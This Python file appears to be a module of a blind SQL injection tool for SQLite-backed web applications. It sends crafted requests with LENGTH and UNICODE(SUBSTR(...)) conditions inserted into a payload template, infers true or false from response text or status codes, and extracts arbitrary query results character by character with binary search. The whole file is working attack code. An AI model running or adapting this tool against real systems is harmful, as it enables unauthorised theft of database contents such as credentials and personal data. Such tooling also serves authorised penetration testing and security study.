"""Boolean-based blind SQLi extraction helpers for SQLite."""

import sys
from urllib.parse import parse_qsl

import requests

MAX_OUT_LENGTH = 80


# Main API method
def run_query(query, args):
    """
    Extract a single-string result.
    The query must return exactly one string value
    """
    length = get_length(query, args)
    if length == 0:
        print("[!] Length is 0 - nothing to extract or query failed.")
        return ""

    print(f"[*] Extracting {length} characters...")
    result = ""
    for pos in range(1, length + 1):
        result += extract_char(query, pos, args)
        sys.stdout.write(f"\r[+] Current: {result}")
        sys.stdout.flush()
    print()
    return result


def send_request(url, method, data, headers, cookies, timeout):
    try:
        if method.upper() == "GET":
            r = requests.get(
                url,
                headers=headers,
                cookies=cookies,
                timeout=timeout,
                allow_redirects=True,
            )
        else:
            r = requests.post(
                url,
                # Treat --data as an application/x-www-form-urlencoded body.
                data=parse_qsl(data, keep_blank_values=True) if data else None,
                headers=headers,
                cookies=cookies,
                timeout=timeout,
                allow_redirects=True,
            )
        return r
    except requests.exceptions.Timeout:
        return None
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None


def is_true_boolean(response, true_string=None, true_status=None, false_string=None):
    if response is None:
        return False
    if true_status is not None and response.status_code == true_status:
        return True
    if true_string and true_string in response.text:
        return True
    if false_string and false_string not in response.text:
        return True
    return False


def request_options(args):
    headers = {}
    if args.headers:
        for header in args.headers:
            key, value = header.split(":", 1)
            headers[key.strip()] = value.strip()

    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(";"):
            if "=" in cookie:
                key, value = cookie.strip().split("=", 1)
                cookies[key] = value

    return headers, cookies


# ----------------------------
# Binary search extraction
# ----------------------------


def get_length(query, args):
    print(f"[*] Determining length of: {query}")
    low, high = 0, getattr(args, "max_length", MAX_OUT_LENGTH)
    length = 0

    while low <= high:
        mid = (low + high) // 2
        cond = f"LENGTH(({query}))>{mid}"
        if evaluate(cond, args):
            low = mid + 1
            length = low
        else:
            high = mid - 1

    print(f"[+] Length = {length}")
    return length


def extract_char(query, position, args):
    # Extract one single character of the query result using binary search
    low, high = 32, 126  # printable ASCII range

    while low < high:
        mid = (low + high) // 2
        cond = f"UNICODE(SUBSTR(({query}),{position},1))>{mid}"
        if evaluate(cond, args):
            low = mid + 1
        else:
            high = mid

    return chr(low)


# ----------------------------
# Evaluation of a condition
# ----------------------------


def evaluate(cond, args):
    payload = args.payload.replace("{cond}", cond)

    # Build request
    if args.method.upper() == "GET":
        final_url = args.url.replace("{payload}", payload)
        data = None
    else:
        final_url = args.url
        data = args.data.replace("{payload}", payload) if args.data else None

    headers, cookies = request_options(args)

    response = send_request(
        final_url, args.method, data, headers, cookies, timeout=args.timeout
    )
    return is_true_boolean(
        response,
        true_string=args.true_string,
        true_status=args.true_status,
        false_string=args.false_string,
    )
